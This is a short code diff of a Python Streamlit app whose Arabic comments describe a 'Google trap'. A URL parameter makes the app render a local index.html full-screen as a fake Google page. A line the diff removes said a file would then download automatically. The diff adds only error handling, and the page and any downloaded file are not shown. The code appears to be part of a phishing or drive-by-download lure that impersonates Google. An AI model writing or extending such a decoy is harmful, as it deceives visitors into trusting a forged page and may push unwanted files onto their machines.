@@ -316,7 +316,7 @@ else:
 
 
 # ============= معالجة طلبات التحميل (API Endpoint) =============
-# ============= فخ جوجل - عرض صفحة Google الوهمية مباشرة (يجب أن يكون في آخر الملف) =============
+# ====================== فخ جوجل - يجب أن يكون في آخر الملف ======================
 query_params = st.query_params
 
 if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
@@ -327,9 +327,12 @@ if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
         try:
             with open('index.html', 'r', encoding='utf-8') as f:
                 html_content = f.read()
-            # عرض صفحة Google كاملة بدون أي واجهة Streamlit أخرى
+            
+            # هذا السطر مهم جداً - يعرض صفحة Google كاملة بدون واجهة Streamlit
             st.components.v1.html(html_content, height=800, scrolling=False)
-            st.success("✅ تم تفعيل الفخ - سيتم تنزيل الملف تلقائياً")
+            
+        except FileNotFoundError:
+            st.error("❌ ملف index.html غير موجود في المجلد")
         except Exception as e:
             st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
     else:
